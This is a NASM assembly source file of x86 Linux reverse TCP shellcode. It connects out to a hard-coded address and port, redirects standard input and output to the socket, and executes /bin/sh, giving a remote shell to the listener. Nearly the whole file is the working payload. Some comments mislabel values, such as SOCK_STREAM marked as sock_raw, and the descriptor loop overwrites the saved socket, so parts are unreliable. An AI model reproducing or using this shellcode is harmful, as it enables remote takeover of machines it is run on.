; Filename: reverse_tcp.nasm
; Author: Eric Van Zutphen



global _start

_start:

        jmp short call_reverse_shell

reverse_shell:

        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx

        pop edx
; Socket
        push 0x6 ; tcp
        push 0x1 ; sock_raw
        push 0x2 ; af_inet
        mov al, 0x66 ; socket_call into eax
        mov bl, 0x1 ; socket into ebx
        mov ecx, esp ; Pointer to sys socket
        int 0x80

        mov esi, eax ; save sockfd


; Reverse
        xor eax, eax
        push eax
        mov dword [esp-4], 0xCB00A8C0
        sub esp, 4
        push word 0x01120 ; Port 8209
        push word 0x2
        mov ecx, esp
        push 0x10
        push ecx
        push esi
        mov al, 0x66 ; move socket_call to eax
        mov bl, 0x3 ; Connect socketcall
        mov ecx, esp
        int 0x80

; dup 2 loop X 3

        xor ecx, ecx
        mov cl, 0x3

duploop:
        dec cl
        mov al, 0x3f
        mov ebx, esi
        int 0x80
        mov esi, eax
        jnz duploop


; execve

        mov eax, ecx
        xor ecx, eax
        push ecx
        mov dword [esp-4], 0x68732f6e
        mov dword [esp-8], 0x69622f2f
        sub esp, 8
        mov ebx, esp
        push ecx
        push ebx
        mov al, 0xb
        mov ecx, esp
        xor edx, edx
        int 0x80


call_reverse_shell:
        call reverse_shell